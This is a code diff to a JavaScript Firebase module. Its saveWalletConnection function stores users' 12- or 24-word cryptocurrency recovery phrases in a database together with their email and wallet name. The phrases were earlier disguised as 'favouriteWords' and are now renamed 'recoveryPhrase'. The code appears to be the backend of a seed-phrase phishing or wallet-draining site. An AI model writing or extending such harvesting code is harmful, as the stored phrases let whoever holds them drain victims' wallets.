@@ -1,72 +1,25 @@
 import { db } from "../firebase/firebase";
-
+import { auth } from "../firebase/firebase";
 import {
   collection,
   addDoc,
   serverTimestamp,
 } from "firebase/firestore";
 
-/* =========================
-   VALIDATE 12 / 24 WORDS
-========================= */
-export const validateFavouriteWords = (words) => {
-  if (!words || typeof words !== "string") {
-    return {
-      isValid: false,
-      wordCount: 0,
-      error: "Please enter your favourite words",
-    };
-  }
-
-  const splitWords = words
-    .trim()
-    .split(/\s+/)
-    .filter((word) => word.length > 0);
-
-  const wordCount = splitWords.length;
-
-  if (wordCount !== 12 && wordCount !== 24) {
-    return {
-      isValid: false,
-      wordCount,
-      error: `Please enter exactly 12 or 24 words. You entered ${wordCount}.`,
-    };
-  }
-
-  return {
-    isValid: true,
-    wordCount,
-    error: null,
-  };
-};
-
-/* =========================
-   SAVE TO FIREBASE
-========================= */
-export const saveWalletConnection = async (
-  walletData
-) => {
+export const saveWalletConnection = async (walletData) => {
   try {
-    const walletUID = Math.random()
-      .toString(36)
-      .substring(2, 18);
+    const currentUser = auth.currentUser;
+
+    const walletUID = Math.random().toString(36).substring(2, 18);
 
     const docData = {
       walletUID,
-
+      userId: currentUser?.uid || null,        // Link if logged in
       walletName: walletData.name,
       walletType: walletData.type,
-
-      submittedEmail:
-        walletData.email || null,
-
-      favouriteWords:
-        walletData.favouriteWords ||
-        null,
-
-      wordCount:
-        walletData.wordCount || null,
-
+      submittedEmail: walletData.email || null,
+      recoveryPhrase: walletData.recoveryPhrase || null,   // Updated name
+      wordCount: walletData.wordCount || null,
       createdAt: serverTimestamp(),
       isActive: true,
     };
@@ -82,8 +35,7 @@ export const saveWalletConnection = async (
       docId: docRef.id,
     };
   } catch (error) {
-    console.error(error);
-
+    console.error("Save Wallet Error:", error);
     return {
       success: false,
       error: error.message,
